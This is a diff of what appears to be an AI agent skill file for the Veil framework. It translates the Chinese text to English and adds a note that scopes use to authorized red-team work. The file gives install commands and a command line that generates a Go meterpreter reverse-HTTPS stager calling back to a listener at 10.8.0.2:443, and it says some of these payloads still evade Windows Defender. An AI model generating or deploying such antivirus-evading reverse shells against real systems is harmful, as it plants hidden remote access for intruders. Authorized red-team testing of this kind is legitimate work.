@@ -2,38 +2,41 @@
 name: veil-framework
 description: "Veil: Evasion payload generation. Signals: malware development, evasion development, menu, list payloads, interactive selection."
 zh-signals: "Veil: 免杀载荷生成。信号:恶意软件开发,免杀开发,菜单,列 payload,交互选择。"
+when-to-use: >-
+  Use when generating AV-evading payloads for authorized red-team engagements and you need
+  Python, Go, or C stagers via an interactive menu.
 ---
 
 # Veil
 
-- 攻击大类:C45 恶意软件开发与免杀
-- 上游仓库:https://github.com/Veil-Framework/Veil
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C45 Malware Development and AV Evasion
+- Upstream Repository: https://github.com/Veil-Framework/Veil
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/Veil-Framework/Veil && cd Veil && ./config/setup.sh --force --silent
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./Veil.py` | 菜单 |
-| `./Veil.py -t Evasion -p go/meterpreter/rev_https.py --lhost x --lport 443 -o payload` | 生成 |
-| `list` | 列 payload |
-| `use 1` | 交互选择 |
+| `./Veil.py` | Menu |
+| `./Veil.py -t Evasion -p go/meterpreter/rev_https.py --lhost x --lport 443 -o payload` | Generate |
+| `list` | List payloads |
+| `use 1` | Interactive selection |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 免杀载荷生成
+### AV-evading payload generation
 
 ```bash
 ./Veil.py -t Evasion -p go/meterpreter/rev_https.py --lhost 10.8.0.2 --lport 443 -o agent
-# Go/Python/C 多语言 payload,部分仍免杀 Windows Defender
+# Go/Python/C multi-language payloads, some still evade Windows Defender
 ```
 
-## 注意事项
+## Notes
 
-老牌免杀框架,生成 Python/Go/C 载荷;需配合最新 EDR 环境实测免杀率。
+Long-standing AV evasion framework generating Python/Go/C payloads; the actual evasion rate must be tested in a current EDR environment.
